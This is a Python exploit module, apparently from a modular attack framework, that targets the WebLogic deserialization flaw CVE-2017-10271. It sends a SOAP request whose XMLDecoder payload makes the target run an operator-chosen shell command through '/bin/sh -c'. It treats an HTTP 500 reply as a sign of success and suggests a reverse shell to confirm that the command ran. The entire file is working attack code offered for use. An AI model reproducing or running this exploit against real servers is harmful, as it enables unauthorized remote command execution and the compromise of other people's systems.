import requests
from core.base_module import BaseModule
from rich.console import Console

class WeblogicDeserializationRce(BaseModule):
    """Exploits a WebLogic deserialization RCE (CVE-2017-10271)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP or domain.'],
            'RPORT': [7001, 'The target WebLogic port.'],
            'CMD': ['id', 'The command to execute on the target.']
        }

    def run(self, options):
        """
        Executes the WebLogic deserialization exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        target_url = f"http://{rhost}:{rport}/wls-wsat/CoordinatorPortType"
        headers = {
            'Content-Type': 'text/xml',
            'SOAPAction': '""'
        }

        # XML payload for CVE-2017-10271
        payload = f"""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8.0_151" class="java.beans.XMLDecoder">
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      <string>{cmd}</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        """

        console.print(f"[*] Targeting WebLogic at: {target_url}")
        console.print(f"[*] Sending deserialization payload to execute: {cmd}")

        try:
            # The exploit does not return command output, it just executes the command.
            # A 500 error is often an indicator of successful execution.
            response = requests.post(target_url, data=payload.format(cmd=cmd), headers=headers, timeout=20)

            if response.status_code == 500:
                console.print("[bold green][+] Payload sent successfully![/bold green]")
                console.print("[yellow][*] The server returned a 500 error, which may indicate successful command execution.[/yellow]")
                console.print("[yellow][*] This exploit is blind; you will not see command output here. Use a reverse shell or OAST for verification.[/yellow]")
            else:
                console.print(f"[!] Exploit likely failed. The server may not be vulnerable.", style="bold red")
                console.print(f"Status: {response.status_code}, Response: {response.text[:200]}")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
